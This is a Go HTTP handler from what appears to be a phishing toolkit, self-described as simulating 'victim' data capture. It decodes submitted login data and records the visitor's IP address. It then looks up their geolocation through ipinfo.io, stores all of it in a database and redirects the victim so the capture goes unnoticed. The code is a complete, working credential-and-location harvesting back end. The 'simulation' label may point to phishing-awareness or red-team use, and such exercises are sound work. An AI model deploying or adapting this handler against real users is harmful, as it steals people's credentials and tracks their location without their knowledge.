package handlers

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/h3th-IV/mackerel/internal/database"
	"github.com/h3th-IV/mackerel/internal/models"
	"github.com/h3th-IV/mackerel/internal/utils"
	"go.uber.org/zap"
)

/*
This Handler/controller simulates capturing victim data, including geolocation.
*/

var (
	_ http.Handler = &CaptureDataHandler{}
)

type CaptureDataHandler struct {
	logger      *zap.Logger
	mysqlclient database.Database
}

func NewCaptureHandler(logger *zap.Logger, mysqlclient database.Database) *CaptureDataHandler {
	return &CaptureDataHandler{
		logger:      logger,
		mysqlclient: mysqlclient,
	}
}

func (handler *CaptureDataHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	var (
		user *models.User
		TTL  = 30
	)
	resp := map[string]interface{}{}
	if err := json.NewDecoder(r.Body).Decode(&user); err != nil {
		resp["err"] = "please try logging in again"
		handler.logger.Error("error decoding data", zap.Error(err))
		apiResponse(w, GetErrorResponseBytes(resp, TTL, nil), http.StatusBadRequest)
		return
	}

	// Capture victim's IP address
	ip_addr := utils.GetIPAddress(r)
	user.IpAddress = ip_addr
	fmt.Println("Captured IP Address:", ip_addr)

	// Fetch geolocation based on IP address
	geoLocation, err := handler.getGeolocation(ip_addr)
	if err != nil {
		resp["err"] = "unable to fetch location"
		handler.logger.Error("error fetching geolocation", zap.Error(err))
		apiResponse(w, GetErrorResponseBytes(resp, TTL, nil), http.StatusInternalServerError)
		return
	}

	//add geolocation data to user (if needed)
	user.Location = *geoLocation
	fmt.Printf("Captured Geolocation: %+v\n", geoLocation)

	//capture data in the database
	captured, err := handler.mysqlclient.CaptureData(r.Context(), user)
	if err != nil {
		resp["err"] = "unable to redirect"
		handler.logger.Error("error capturing data", zap.Error(err))
		apiResponse(w, GetErrorResponseBytes(resp, TTL, nil), http.StatusInternalServerError)
		return
	}
	if !captured {
		resp["err"] = "unable to redirect"
		handler.logger.Error("error writing data to db, returned without err", zap.Bool("captured", captured))
		apiResponse(w, GetErrorResponseBytes(resp, TTL, nil), http.StatusInternalServerError)
		return
	}

	//rEdirect after successful data capture
	resp["message"] = "redirecting..."
	apiResponse(w, GetSuccessResponse(resp, TTL), http.StatusPermanentRedirect)
	fmt.Println("user data captured successfully")
}

// Function to fetch geolocation based on IP address
func (handler *CaptureDataHandler) getGeolocation(ip string) (*models.GeoLocation, error) {
	fmt.Println("getting ip info...")
	geoAPI := fmt.Sprintf("https://ipinfo.io/%s/geo", ip)
	client := &http.Client{Timeout: 10 * time.Second}

	resp, err := client.Get(geoAPI)
	if err != nil {
		return nil, fmt.Errorf("error making request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("err: received status code %d", resp.StatusCode)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response body: %w", err)
	}

	//parse the geolocation data
	var geoData models.GeoLocation
	if err := json.Unmarshal(body, &geoData); err != nil {
		return nil, fmt.Errorf("error unmarshalling JSON: %w", err)
	}

	return &geoData, nil
}
